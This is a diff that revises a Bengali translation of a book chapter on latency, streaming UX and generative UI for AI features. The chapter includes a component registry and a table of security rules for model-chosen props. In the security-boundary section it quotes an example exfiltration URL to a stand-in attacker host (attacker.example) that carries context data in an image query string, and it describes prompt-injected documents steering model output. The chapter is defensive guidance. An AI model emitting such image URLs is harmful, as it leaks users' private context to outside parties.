@@ -1,27 +1,27 @@
 ---
 sourceHash: "552f3b23c85361bd997d92ab03fd91051cbfa883af4a0d3f300954639252ff89"
 title: "Latency ও Generative UI"
-translatedAt: "2026-10-13T03:06:13.172Z"
+translatedAt: "2026-10-19T08:02:01.874Z"
 model: "claude-opus-5-5 (Claude Code)"
 ---
 
 # Latency ও Generative UI {#ch-generative-ui}
 
-> কয়েক সেকেন্ডের একটি উত্তরকে responsive মনে করান, তারপর model-কে একটি নির্দিষ্ট allow-list থেকে আপনার component বাছতে দিন, কোনো ফাঁক না খুলে।
+> কয়েক সেকেন্ডের উত্তরকেও তৎপর মনে হওয়ার মতো করুন। তারপর model-কে একটি নির্দিষ্ট allow-list থেকে আপনার component বাছতে দিন, কোনো ফাঁক না খুলে।
 
-**এই অধ্যায়ে:** time to first token · user অপেক্ষা করার সময় কী দেখাবেন · দীর্ঘ সময় ধরে চলা কাজ · component registry · model-এর বাছা props-এর security boundary
+**এই অধ্যায়ে:** প্রথম token আসতে সময় · user অপেক্ষা করার সময় কী দেখাবেন · লম্বা সময়ের কাজ · component registry · model-এর বাছা props-এর security boundary
 
 ## 💡 মূল ধারণা
 
-একটি AI feature-এর সৎ ন্যূনতম সময় হলো **প্রথম token পর্যন্ত কয়েকশো millisecond, আর পুরো উত্তর পর্যন্ত কয়েক সেকেন্ড**।
-Model একবারে একটি করে token তৈরি করে, তাই কোনো engineering এই অপেক্ষা সরাতে পারে না। একে দ্রুত করা যাবে না, তাই একে
-responsive মনে করান। আগেভাগে progress দেখান, সেটা চলমান রাখুন, user-কে পড়ার মতো কিছু দিন।
+AI feature-এর সৎ ন্যূনতম সময় হলো **প্রথম token পর্যন্ত কয়েকশো millisecond, আর পুরো উত্তর পর্যন্ত কয়েক সেকেন্ড**।
+Model একটি একটি করে token বানায়, তাই কোনো engineering দিয়েই এই অপেক্ষা সরানো যায় না। দ্রুত করতে পারবেন না, তাই
+তৎপর মনে হওয়ার মতো করুন। শুরুতেই অগ্রগতি দেখান, সেটা চলতে দিন, user-কে পড়ার মতো কিছু দিন।
 
-উত্তর এসে গেলে, গদ্য প্রায়ই ভুল আকার। গত quarter-এর revenue নিয়ে একটি প্রশ্নের দরকার একটি chart, একটি table আর একটি
-link। **Generative UI model-কে component বাছতে দেয়, অথচ কোন component আছে আর সেগুলো কী পেতে পারে, তার মালিক আপনার
-code।** Model একটি branch বাছে। সে code লেখে না।
+উত্তর আসার পর দেখা যায়, গদ্য প্রায়ই ভুল আকার। গত quarter-এর আয় নিয়ে প্রশ্ন করলে দরকার একটি chart, একটি table আর
+একটি link। **Generative UI-তে component বাছে model, কিন্তু কোন কোন component আছে আর সেগুলো কী পেতে পারে, তা ঠিক করে
+আপনার code।** Model একটি branch বেছে নেয়। Code লেখে না।
 
-> User-রা একটি ধীর উত্তর ক্ষমা করেন। যে interface তাঁদের কিছুই দেখায় না, সেটা ক্ষমা করেন না।
+> ধীর উত্তর user ক্ষমা করেন। কিছুই না দেখানো interface ক্ষমা করেন না।
 
 ## কীভাবে কাজ করে
 
@@ -31,60 +31,59 @@ code।** Model একটি branch বাছে। সে code লেখে ন
 | --- | --- | --- |
 | আপনার server পর্যন্ত network | 20–80 ms | সামান্য |
 | Retrieval | 50–400 ms | হ্যাঁ — index, *k*, reranking |
-| Prompt assembly | 1–20 ms | খুব কমই কষ্টের মূল্য দেয় |
-| **Time to first token** | 200 ms – 2 s | হ্যাঁ — ছোট model, ছোট prompt, caching |
-| Token generation | 20–150 tokens/s | শুধু কম generate করে |
+| Prompt জোড়া লাগানো | 1–20 ms | খুব কমই লাভ হয় |
+| **প্রথম token আসতে সময়** | 200 ms – 2 s | হ্যাঁ — ছোট model, ছোট prompt, caching |
+| Token তৈরি | 20–150 tokens/s | শুধু কম তৈরি করে |
 
-**User-রা যে সংখ্যাটা টের পান, সেটা time to first token।** যে উত্তর 400 ms-এ শুরু হয়ে আট সেকেন্ডে শেষ হয়, সেটা
-চার সেকেন্ডে শুরু হয়ে পাঁচ সেকেন্ডে শেষ হওয়া উত্তরের চেয়ে ভালো লাগে। Retrieval আর reranking পুরোপুরি প্রথম token-এর
-আগে বসে। Documentation assistant-এ 400 ms-এর একটি reranker চোখে পড়ার মতো প্রতিটি byte-কে দেরি করায়। Prompt-এর দৈর্ঘ্যও
-first-token-এর সময়ে প্রভাব ফেলে। বিশটি নয়, পাঁচটি ভালো chunk পাঠানোর এটা আরেকটি কারণ।
+**User যে সংখ্যাটা টের পান, সেটা প্রথম token আসতে সময়।** যে উত্তর 400 ms-এ শুরু হয়ে আট সেকেন্ডে শেষ হয়, সেটা চার
+সেকেন্ডে শুরু হয়ে পাঁচ সেকেন্ডে শেষ হওয়া উত্তরের চেয়ে ভালো লাগে। Retrieval আর reranking পুরোটাই প্রথম token-এর আগে
+বসে। Documentation assistant-এ 400 ms-এর একটি reranker চোখে দেখা যাওয়ার মতো প্রতিটি byte-কে দেরি করিয়ে দেয়। Prompt
+কত লম্বা, তার ওপরও প্রথম token-এর সময় নির্ভর করে। বিশটি নয়, পাঁচটি ভালো chunk পাঠানোর এটা আরও একটি কারণ।
 
-Page-এর এখনো একটি INP target আছে (input-এ কত দ্রুত সাড়া দেয়), আর প্রতিটি token-এ re-render হওয়া একটি pane সেটায়
-fail করবে। [Chapter ?? — Core Web Vitals](#ch-core-web-vitals) দেখুন।
+Page-এর একটি INP লক্ষ্য তবু থাকে (input পেলে কত দ্রুত সাড়া দেয়), আর যে pane প্রতিটি token-এ re-render হয়, সেটা
+সেই লক্ষ্যে পৌঁছাতে পারবে না। দেখুন [Chapter ?? — Core Web Vitals](#ch-core-web-vitals)।
 
 ### অপেক্ষার সময়টা কী দিয়ে ভরাবেন
 
 | সময় | কী দেখাবেন | কেন |
 | --- | --- | --- |
-| 300 ms-এর কম | কিছুই না | এক ঝলক দেখা দেওয়া spinner না থাকার চেয়েও খারাপ |
-| 300 ms – 1 s | একটি সূক্ষ্ম indicator | Input পাওয়া গেছে তা জানান |
-| 1–3 s | নাম দেওয়া একটি ধাপ: "docs-এ খোঁজা হচ্ছে" | এমন progress, যার অর্থ আছে |
-| 3–10 s | Stream করা content | উত্তর নিজেই progress bar |
-| 10 s-এর বেশি | ধাপে ধাপে progress, একটি cancel button | User-এর নিয়ন্ত্রণ দরকার |
+| 300 ms-এর কম | কিছুই না | এক ঝলক spinner না থাকার চেয়েও খারাপ |
+| 300 ms – 1 s | হালকা একটি indicator | Input পাওয়া গেছে, এটুকু জানান |
+| 1–3 s | ধাপের নাম: "docs-এ খুঁজছি" | এমন অগ্রগতি, যার একটি মানে আছে |
+| 3–10 s | Stream হওয়া content | উত্তরটাই progress bar |
+| 10 s-এর বেশি | ধাপে ধাপে অগ্রগতি, একটি cancel button | User-এর হাতে নিয়ন্ত্রণ দরকার |
 
-Team-রা তৃতীয় সারিটা বাদ দেয়। **একটি ধাপের label তথ্য, সাজসজ্জা নয়।** "Docs-এ খোঁজা হচ্ছে" দেখায় system প্রশ্নটা
-কীভাবে পড়েছে, তাই যে user-এর প্রশ্ন ভুল বোঝা হয়েছে, তিনি আট সেকেন্ড পরে নয়, এখনই থামাতে পারেন।
+Team-রা তৃতীয় row-টা বাদ দেয়। **ধাপের নাম তথ্য, সাজসজ্জা নয়।** "Docs-এ খুঁজছি" দেখে বোঝা যায় system প্রশ্নটা কীভাবে
+পড়েছে। তাই ভুল বোঝা হলে user আট সেকেন্ড পরে নয়, এখনই থামাতে পারেন।
 
-Streaming একটি লম্বা অপেক্ষাকে একটি আগেভাগে শুরুতে পরিণত করে, তারপর text আসে মানুষ যত দ্রুত পড়ে তার চেয়েও দ্রুত।
+Streaming একটি লম্বা অপেক্ষাকে বদলে দেয় তাড়াতাড়ি শুরুতে, তারপর মানুষ যত দ্রুত পড়ে তার চেয়ে দ্রুত text আসতে থাকে।
 Transport-এর কথা আছে [Chapter ?? — Streaming Response](#ch-streaming-responses)-এ। Interface-এর নিয়মগুলো এই:
 
-- **প্রতিটি token এসে পৌঁছানো মাত্র render করুন।** বাক্যের শেষ পর্যন্ত buffer করলে সেই অপেক্ষা ফিরে আসে, যেটা সরাতে
-  আপনি খরচ করেছেন।
-- **Layout স্থির রাখুন।** জায়গা আগে থেকে রেখে দিন, যাতে প্রতিটি chunk-এ container reflow না হয়।
-- **User-কে পেরিয়ে কখনো auto-scroll করবেন না।** নিচে pin করে রাখুন শুধু তখনই, যখন তিনি ইতিমধ্যে নিচে আছেন।
-- **প্রথম token থেকেই একটি cancel control দেখান।** সময় আর খরচের ওপর user-এর একমাত্র নিয়ন্ত্রণ এটাই।
+- **প্রতিটি token আসার সঙ্গে সঙ্গে render করুন।** বাক্য শেষ হওয়া পর্যন্ত buffer করলে যে অপেক্ষা সরাতে খরচ করেছেন,
+  সেটাই ফিরে আসে।
+- **Layout স্থির রাখুন।** জায়গাটা আগে থেকে রেখে দিন, যাতে প্রতিটি chunk-এ container reflow না হয়।
+- **User-কে ছাড়িয়ে কখনো নিজে থেকে scroll করবেন না।** নিচে আটকে রাখুন শুধু তখনই, যখন user আগে থেকেই নিচে আছেন।
+- **প্রথম token থেকেই cancel control দেখান।** সময় আর খরচের ওপর user-এর একমাত্র নিয়ন্ত্রণ এটাই।
 
 ### উত্তর আসার আগের কাজ
 
-Input-এ focus হলেই retrieval prefetch করা, একটি keystroke-এ connection গরম করা, আর user-এর message সাথে সাথে দেখিয়ে
-দেওয়া প্রায় বিনা খরচের। সম্ভাব্য একটি প্রশ্নের জন্য আন্দাজে model call করা তা নয়। অব্যবহৃত একটি call মানে অকারণে
-খরচ করা টাকা, আর বড় scale-এ এই নষ্ট call-গুলো দ্রুত জমে যায়।
+Input-এ focus এলেই retrieval prefetch করা, keystroke-এ connection warm করে রাখা, আর user-এর message সঙ্গে সঙ্গে
+দেখিয়ে দেওয়া, এগুলো প্রায় বিনা খরচে হয়। সম্ভাব্য প্রশ্ন আন্দাজ করে আগেই model call করা তা নয়। ব্যবহার না হওয়া
+call মানে অকারণে টাকা খরচ, আর বড় পরিসরে এই নষ্ট call দ্রুত জমে যায়।
 
-> ⚠️ এখানে optimistic UI-এর মানে কম। একটি request শুরু হয়েছে, তা আপনি সাথে সাথে দেখাতে পারেন। উত্তরটা আগেভাগে দেখাতে
-> পারেন না, কারণ আপনি সেটা জানেন না। যে interface user-এর হয়ে আন্দাজ করে, সেটা কাজ চলছে বলে স্বীকার করা interface-এর
+> ⚠️ এখানে optimistic UI-র ভূমিকা কম। Request শুরু হয়েছে, সেটা সঙ্গে সঙ্গে দেখাতে পারেন। কিন্তু উত্তরটা আগে দেখাতে
+> পারবেন না, কারণ সেটা আপনি জানেন না। যে interface user-এর হয়ে আন্দাজ করে, সেটা "কাজ চলছে" স্বীকার করা interface-এর
 > চেয়ে খারাপ।
 
-### দীর্ঘ সময় ধরে চলা কাজ
+### লম্বা সময়ের কাজ
 
-দশ সেকেন্ড পেরিয়ে গেলে একটি chat window ভুল আকার। কয়েক মিনিটের একটি agent run-এর দরকার একটি background job-এর
-সরঞ্জাম: চোখে দেখা যায় এমন একটি plan, ধাপের progress, এমন একটি cancel যেটা সত্যিই থামায়, আর এমন একটি result যেটা page
-ছেড়ে গেলেও টিকে থাকে। আগে plan দেখান। ভুল বোঝা একটি কাজ বারো নম্বর ধাপে নয়, এক নম্বর ধাপে থামালে সময় আর টাকা দুটিই
-বাঁচে।
+দশ সেকেন্ড পেরোলে chat window আর ঠিক আকার নয়। কয়েক মিনিটের agent run-এর দরকার background job-এর সরঞ্জাম: চোখে
+দেখা যায় এমন plan, ধাপের অগ্রগতি, এমন cancel যেটা সত্যিই থামায়, আর এমন result যেটা page ছেড়ে গেলেও থেকে যায়।
+আগে plan দেখান। ভুল বোঝা কাজ বারো নম্বর ধাপে নয়, এক নম্বর ধাপেই থামাতে পারলে সময় আর টাকা দুটিই বাঁচে।
 
 ### Component registry
 
-**Registry আর renderer — নামটা একটি lookup, props validate করা হয়**
+**Registry আর renderer — নামটা দিয়ে খোঁজা হয়, props validate হয়**
 
 ```tsx
 const registry = {
@@ -110,12 +109,12 @@ function render(name: string, props: unknown) {
 }
 ```
 
-তিনটি জিনিস এটাকে নিরাপদ করে। **অচেনা একটি নাম একটি fallback render করে**, model-এর বানানো কিছু কখনোই নয়। **Render-এর
-আগে props যাচাই হয়**, তাই একটি field না থাকলে একটি fallback আসে, ভাঙা component নয়। **সীমা থাকে schema-তে**, যেমন 50টি
-point আর 40টি character। খোলামেলা একটি array পেলে model কখনো কখনো বিশাল একটি array তৈরি করে।
+তিনটি জিনিস এটাকে নিরাপদ রাখে। **অচেনা নাম এলে fallback render হয়**, model-এর বানানো কিছু কখনো নয়। **Render-এর
+আগে props যাচাই হয়**, তাই কোনো field না থাকলে ভাঙা component নয়, fallback আসে। **সীমা থাকে schema-তে**, যেমন 50টি
+point আর 40টি character। খোলা array দিলে model মাঝে মাঝে বিশাল একটি array বানিয়ে ফেলে।
 
-Model block বের করে [Chapter ?? — Structured Output](#ch-structured-output)-এর মাধ্যমে। একটি discriminated union বেশিরভাগ
-অবৈধ নাম decoding-এর ধাপেই থামিয়ে দেয়, fallback দরকার হওয়ার আগেই।
+Model block বের করে [Chapter ?? — Structured Output](#ch-structured-output) দিয়ে। Discriminated union বেশিরভাগ ভুল
+নাম decoding-এর ধাপেই আটকে দেয়, fallback দরকার হওয়ার আগেই।
 
 **Output schema — model শুধু সেই component-গুলোর নাম বলতে পারে, যেগুলো আছে**
 
@@ -128,103 +127,104 @@ const UiBlock = z.discriminatedUnion('component', [
 
 ### Security boundary
 
-প্রতিটি prop এমন একটি value, যেটা model তৈরি করেছে, আংশিকভাবে এমন document থেকে যেগুলো আপনি নিয়ন্ত্রণ করেন না। Props-কে
-একটি attack surface হিসেবে দেখুন।
+প্রতিটি prop এমন একটি value, যেটা model বানিয়েছে, আর তার কিছুটা এসেছে এমন document থেকে যেটা আপনার নিয়ন্ত্রণে নেই।
+Props-কে attack-এর জায়গা হিসেবে ধরুন।
 
-| Prop-এর type | ঝুঁকি | নিয়ম |
+| Prop-এর ধরন | ঝুঁকি | নিয়ম |
 | --- | --- | --- |
-| Text | Inject করা instruction তথ্য হিসেবে দেখানো | Text হিসেবে render করুন, কখনোই HTML হিসেবে নয় |
-| URL (`href`, `src`) | Data বের করার channel, phishing-এর লক্ষ্য | Origin allow-list করুন, অথবা একটি id পাঠিয়ে server-এ resolve করুন |
-| Markdown | Script, image, যেকোনো link | Tag আর attribute-এর একটি কঠোর allow-list |
-| একটি id | নিরাপদ | User যা দেখতে পারেন, তার সাথে মিলিয়ে server-এ resolve করুন |
-| Raw HTML | Cross-site scripting | কখনোই না |
+| Text | Injected নির্দেশ তথ্য হিসেবে দেখানো | Text হিসেবে render করুন, কখনো HTML হিসেবে নয় |
+| URL (`href`, `src`) | Data পাচারের পথ, phishing-এর লক্ষ্য | Origin allow-list করুন, বা একটি id পাঠিয়ে server-এ resolve করুন |
+| Markdown | Script, image, যেকোনো link | Tag আর attribute-এর কড়া allow-list |
+| একটি id | নিরাপদ | User যা দেখার অনুমতি পান, তার সঙ্গে মিলিয়ে server-এ resolve করুন |
+| কাঁচা HTML | Cross-site scripting | কখনো নয় |
 
-URL-এর সারিটাই সবচেয়ে গুরুত্বপূর্ণ, যেমনটা [Chapter ?? — Prompt Injection](#ch-prompt-injection) ব্যাখ্যা করে। Model-এর
-নিয়ন্ত্রিত একটি image source একটি বাইরের channel: `https://attacker.example/x.png?d=<context>` render হওয়ামাত্র data ফাঁস
-করে, কোনো click ছাড়াই। Render করার একটি সিদ্ধান্ত lethal trifecta-র তৃতীয় পা যোগ করে দিয়েছে।
+সবচেয়ে গুরুত্বপূর্ণ URL-এর row, যেমনটা [Chapter ?? — Prompt Injection](#ch-prompt-injection) ব্যাখ্যা করে। Model-এর
+নিয়ন্ত্রণে থাকা image source বাইরে যাওয়ার একটি পথ: `https://attacker.example/x.png?d=<context>` render হওয়ার
+সঙ্গে সঙ্গেই data ফাঁস করে, কোনো click ছাড়াই। শুধু render করার একটি সিদ্ধান্ত lethal trifecta-র তৃতীয় পা জুড়ে দিয়েছে।
 
-**Id পাঠান, server-এ resolve করুন।** Documentation assistant-এ একটি citation একটি chunk id বহন করে। Server সেটাকে একটি
-link-এ পরিণত করে শুধু তখনই, যদি সেই chunk এই user-এর জন্য retrieve করা হয়ে থাকে।
+**Id পাঠান, server-এ resolve করুন।** Documentation assistant-এ citation-এর সঙ্গে থাকে একটি chunk id। Server সেটাকে link
+বানায় শুধু তখনই, যদি ওই chunk এই user-এর জন্য retrieve করা হয়ে থাকে।
 
-> ⚠️ Image চালু রেখে model-এর output Markdown হিসেবে render করা একটি data বের করার channel, যদি না image source সীমিত
-> করা থাকে। Generative UI-তে এটাই সবচেয়ে বেশি চোখ এড়িয়ে যাওয়া ফাঁক।
+> ⚠️ Image চালু রেখে model-এর output Markdown হিসেবে render করলে, image source সীমিত না করা পর্যন্ত সেটা data পাচারের
+> পথ। Generative UI-তে সবচেয়ে বেশি চোখ এড়িয়ে যাওয়া ফাঁক এটাই।
 
-### আংশিক একটি component stream করা
+### অসম্পূর্ণ component stream করা
 
-একটি object আসে field ধরে ধরে, তাই props সম্পূর্ণ হওয়ার আগেই একটি component render হতে পারে। Schema validate না হওয়া
-পর্যন্ত একটি skeleton দেখান। পঞ্চাশটির মধ্যে তিনটি point-সহ একটি chart ভুল, progressive নয়। Progressive rendering text-এর
-জন্য মানানসই, এমন কিছুর জন্য নয় যেটা user একটি সংখ্যা হিসেবে পড়েন। আংশিক props-এ কখনো side effect চালাবেন না, কারণ
-আংশিক একটি object কোনো সিদ্ধান্ত নয়।
+Object আসে field ধরে ধরে, তাই props সম্পূর্ণ হওয়ার আগেই component render হতে পারে। Schema validate না হওয়া পর্যন্ত
+একটি skeleton দেখান। পঞ্চাশটি point-এর মধ্যে তিনটি নিয়ে আঁকা chart ধাপে ধাপে আসা নয়, সেটা ভুল। ধাপে ধাপে render
+text-এর জন্য ঠিক আছে, কিন্তু user যা সংখ্যা হিসেবে পড়েন তার জন্য নয়। অসম্পূর্ণ props-এ কখনো side effect চালাবেন না,
+কারণ অসম্পূর্ণ object কোনো সিদ্ধান্ত নয়।
 
 ## কখন ব্যবহার করবেন
 
 | Feature | Design |
 | --- | --- |
-| Chat বা documentation assistant | Stream, ধাপের label, cancel; text আর citation block |
-| নানা রকম প্রশ্নসহ data assistant | Chart, table আর text block-সহ একটি registry |
-| অল্প কয়েকটি জানা উত্তরের আকার | একটি classifier কয়েকটি template-এর একটি বাছে — কোনো generation নেই |
-| যা কিছু লেখে বা খরচ করে | Template, সাথে একটি স্পষ্ট confirmation ধাপ |
-| কয়েক মিনিটের agent run | Background-job UI: plan, progress, cancel, টিকে থাকা একটি result |
+| Chat বা documentation assistant | Stream, ধাপের নাম, cancel; text আর citation block |
+| নানা রকম প্রশ্নের data assistant | Chart, table আর text block-সহ একটি registry |
+| অল্প কয়েকটি জানা আকারের উত্তর | একটি classifier কয়েকটি template থেকে একটি বাছে — কোনো generation নেই |
+| যা কিছু লেখে বা টাকা খরচ করে | Template, সঙ্গে স্পষ্ট confirmation-এর ধাপ |
+| কয়েক মিনিটের agent run | Background job-এর UI: plan, অগ্রগতি, cancel, টিকে থাকা result |
 
-বেশিরভাগ "generative UI"-এর চাহিদা মেটে একটি classifier পাঁচটি layout-এর একটি বাছলেই। এটা দ্রুততর, সস্তা, test করা যায়,
-আর কোনো নতুন security surface যোগ করে না। বানানোর আগে মাপুন generation আদৌ দরকার কিনা।
+"Generative UI" চাওয়া বেশিরভাগ request-এর কাজ মিটে যায় একটি classifier দিয়ে, যেটা পাঁচটি layout-এর একটি বাছে।
+এটা দ্রুত, সস্তা, test করা যায়, আর security-র নতুন কোনো জায়গা খোলে না। বানানোর আগে মেপে দেখুন generation আদৌ
+দরকার কি না।
 
 ## সাধারণ ভুল
 
-**❌ আট সেকেন্ডের অপেক্ষার জন্য একটি spinner**
+**❌ আট সেকেন্ডের অপেক্ষায় একটি spinner**
 
-> এটা কিছুই বলে না, আর সময়টা আরও ধীর মনে হয়। Stream করুন, অন্তত ধাপটার নাম বলুন।
+> এটা কিছুই বলে না, আর সময় আরও ধীর মনে হয়। Stream করুন, নইলে অন্তত ধাপের নাম বলুন।
 
-**✅ ধাপের নাম বলুন আর প্রথম token থেকেই stream করুন**
+**✅ ধাপের নাম বলুন, আর প্রথম token থেকেই stream করুন**
 
-> "Docs-এ খোঁজা হচ্ছে" একই সাথে progress আর শুধরে নেওয়ার একটি সুযোগ। User ভুল বোঝা একটি request আগেভাগে থামাতে পারেন।
+> "Docs-এ খুঁজছি" একই সঙ্গে অগ্রগতি আর শুধরে দেওয়ার সুযোগ। ভুল বোঝা request user তাড়াতাড়ি থামাতে পারেন।
 
-**❌ Model-কে URL, HTML বা অবাধ Markdown দিতে দেওয়া**
+**❌ Model-কে URL, HTML বা সীমাহীন Markdown দিতে দেওয়া**
 
-> Model-এর নিয়ন্ত্রিত একটি `src` বা `href` একটি বাইরের channel। Raw HTML হলো নতুন পথে আসা cross-site scripting।
+> Model-এর নিয়ন্ত্রণে থাকা `src` বা `href` বাইরে যাওয়ার একটি পথ। কাঁচা HTML মানে নতুন রাস্তায় আসা cross-site scripting।
 
-**✅ সীমাবদ্ধ একটি schema-র সাথে props validate করুন, id পাঠান, আর ব্যর্থ হলে fallback-এ যান**
+**✅ সীমা বাঁধা schema দিয়ে props validate করুন, id পাঠান, আর ব্যর্থ হলে fallback দেখান**
 
-> Fallback একটি ভালো ফলাফল। Undefined props-সহ আধা-render হওয়া একটি component তা নয়।
+> Fallback একটি ভালো ফলাফল। Undefined props নিয়ে আধা-render হওয়া component নয়।
 
 ## 🔑 মূল শিক্ষা
 
-- User-রা যে latency টের পান, সেটা time to first token, আর retrieval পুরোপুরি তার আগে বসে।
-- ধাপের নাম বলুন, প্রতিটি token stream করুন, layout স্থির রাখুন, আর একজন পাঠককে পেরিয়ে কখনো auto-scroll করবেন না।
-- দশ সেকেন্ড পেরোলে background-job interface ব্যবহার করুন: চোখে দেখা plan, progress, cancel আর টিকে থাকা result।
-- Model আপনার লেখা একটি registry থেকে বাছে, আর কিছু render হওয়ার আগে তার props একটি সীমাবদ্ধ schema পার হয়।
-- Model-এর দেওয়া URL একটি data বের করার channel, তাই id পাঠান আর server-এ resolve করুন।
+- User যে latency টের পান, সেটা প্রথম token আসতে সময়, আর retrieval পুরোটাই তার আগে বসে।
+- ধাপের নাম বলুন, প্রতিটি token stream করুন, layout স্থির রাখুন, আর পাঠককে ছাড়িয়ে কখনো নিজে থেকে scroll করবেন না।
+- দশ সেকেন্ড পেরোলে background job-এর interface দিন: চোখে দেখা যায় এমন plan, অগ্রগতি, cancel আর টিকে থাকা result।
+- Model বাছে আপনার লেখা registry থেকে, আর কিছু render হওয়ার আগে তার props সীমা বাঁধা schema পার হয়।
+- Model-এর দেওয়া URL data পাচারের পথ, তাই id পাঠান আর server-এ resolve করুন।
 
 ## Interview-এর প্রশ্ন
 
-**Q: Model আট সেকেন্ড নেয়। User কী দেখেন?**
+**Q: Model-এর আট সেকেন্ড লাগে। User কী দেখবেন?**
 
-Spinner নয়। Stream করা text কয়েকশো millisecond-এর মধ্যে শুরু হওয়া উচিত, যাতে অপেক্ষাটা একটি আগেভাগে শুরুতে পরিণত হয়,
-তারপর text আসে তাঁরা যত দ্রুত পড়েন তার চেয়েও দ্রুত। প্রথম token-এর আগে retrieval তখনো চলছে, তাই আমি সেই ধাপের নাম বলি।
-এটা যেকোনো model upgrade-এর চেয়ে দ্রুত মনে হয়, আর এটা একটি frontend পরিবর্তন।
+Spinner নয়। Stream হওয়া text কয়েকশো millisecond-এর মধ্যে শুরু হওয়া উচিত। তাহলে অপেক্ষাটা হয়ে যায় তাড়াতাড়ি শুরু,
+তারপর user যত দ্রুত পড়েন তার চেয়ে দ্রুত text। প্রথম token-এর আগে retrieval চলতে থাকে, তাই সেই ধাপের নাম দেখাই।
+এটা যেকোনো model upgrade-এর চেয়ে দ্রুত মনে হয়, আর পরিবর্তনটা frontend-এর।
 
-**Q: আপনি এমন একটি reranker যোগ করলেন, যেটা উত্তর ভালো করে আর 300 ms খরচ করে। এটা কি লাভজনক?**
+**Q: আপনি এমন একটি reranker যোগ করলেন, যেটা উত্তর ভালো করে কিন্তু 300 ms খরচ করে। এটা কি পোষায়?**
 
-নির্ভর করে 300 ms কোথায় পড়ছে, আর এখানে এটা পুরোপুরি প্রথম চোখে পড়া byte-এর আগে পড়ছে। তাই এটা বিনা খরচের জয় নয়।
-আমি দেখতে চাইব retrieval eval recall@5-এ সত্যিকারের উন্নতি দেখাচ্ছে। ছোট একটি corpus-এ, যেখানে উত্তর ইতিমধ্যে প্রথম পাঁচে
-আছে, এটা শুধুই latency।
+নির্ভর করে 300 ms-টা কোথায় পড়ছে, আর এখানে সেটা পুরোটাই পড়ছে প্রথম চোখে দেখা byte-এর আগে। তাই এটা বিনা খরচের
+লাভ নয়। আমি চাইব retrieval eval-এ recall@5 সত্যিই বাড়ুক। ছোট corpus-এ, যেখানে উত্তর আগে থেকেই প্রথম পাঁচটির মধ্যে
+আছে, সেখানে এটা নিছক latency।
 
-**Q: Model-এর output থেকে component render করার ঝুঁকি কী, আর কীভাবে সেটা আটকান?**
+**Q: Model-এর output থেকে component render করার ঝুঁকি কী, আর কীভাবে সেটা আটকে রাখেন?**
 
-Output এমন একটি system-এর অবিশ্বস্ত input, যেটা attacker-এর নিয়ন্ত্রণে থাকতে পারে এমন document পড়ে। তাই model একটি
-discriminated union-এর মাধ্যমে শুধু আমার registry-র component-এর নাম বলতে পারে, আর প্রতিটি prop একটি সীমাবদ্ধ schema পার
-হয়। অচেনা বা অবৈধ যেকোনো কিছু একটি fallback render করে। ধারালো দিকটা হলো URL: model-এর নিয়ন্ত্রিত একটি image source
-render হওয়ামাত্র context ফাঁস করে, কোনো click ছাড়াই।
+Output অবিশ্বস্ত input, এমন system থেকে আসা যেটা attacker-এর নিয়ন্ত্রণে থাকতে পারে এমন document পড়ে। তাই model
+discriminated union দিয়ে শুধু আমার registry-র component-এর নামই বলতে পারে, আর প্রতিটি prop সীমা বাঁধা schema পার
+হয়। অচেনা বা ভুল কিছু এলে fallback render হয়। সবচেয়ে ধারালো জায়গা হলো URL: model-এর নিয়ন্ত্রণে থাকা image source
+render হলেই context ফাঁস করে, কোনো click ছাড়াই।
 
-**Q: কখন আপনি generative UI বানাবেন না?**
+**Q: কখন generative UI বানাবেন না?**
 
-যখন উত্তরের আকার অল্প আর অনুমানযোগ্য, যা বেশিরভাগ সময়েই হয়। পাঁচটি template-এর মধ্যে বাছাই করা একটি classifier সস্তা,
-দ্রুততর, deterministic, test করা যায়, আর কোনো security surface যোগ করে না। আমি generation-এর দিকে যাই শুধু তখন, যখন উত্তর
-data-র সাথে এমনভাবে বদলায়, যা আমি তালিকা করে বলতে পারি না। Side effect আছে এমন যেকোনো কিছু স্পষ্ট confirmation-সহ একটি
-template-এই থাকে।
+যখন উত্তরের আকার অল্প কয়েকটি আর আগে থেকে জানা, আর বেশিরভাগ সময় সেটাই হয়। পাঁচটি template থেকে একটি বেছে নেওয়া
+classifier সস্তা, দ্রুত, deterministic, test করা যায়, আর security-র কোনো জায়গা খোলে না। Generation-এর দিকে যাই শুধু
+তখন, যখন উত্তর data অনুযায়ী এমনভাবে বদলায় যে আমি তালিকা করে বলতে পারি না। Side effect আছে এমন যেকোনো কিছু থাকে
+template-এ, স্পষ্ট confirmation-সহ।
 
 ## এরপর কী পড়বেন
 
-- [Chapter ?? — Streaming Response](#ch-streaming-responses) — যে transport আগেভাগে token পাঠানো সম্ভব করে
-- [Chapter ?? — Prompt Injection](#ch-prompt-injection) — model-এর দেওয়া একটি URL কেন একটি security সিদ্ধান্ত
-- [Chapter ?? — বিশ্বাস, নির্ভুলতা ও Failure State](#ch-trust-and-correctness-ux) — একটি citation block কীসের জন্য, আর এটা ব্যর্থ হলে interface কী করে
+- [Chapter ?? — Streaming Response](#ch-streaming-responses) — যে transport থাকলে তাড়াতাড়ি token আসা সম্ভব
+- [Chapter ?? — Prompt Injection](#ch-prompt-injection) — model-এর দেওয়া URL কেন security-র সিদ্ধান্ত
+- [Chapter ?? — বিশ্বাস, নির্ভুলতা ও Failure State](#ch-trust-and-correctness-ux) — citation block কীসের জন্য, আর ব্যর্থ হলে interface কী করে
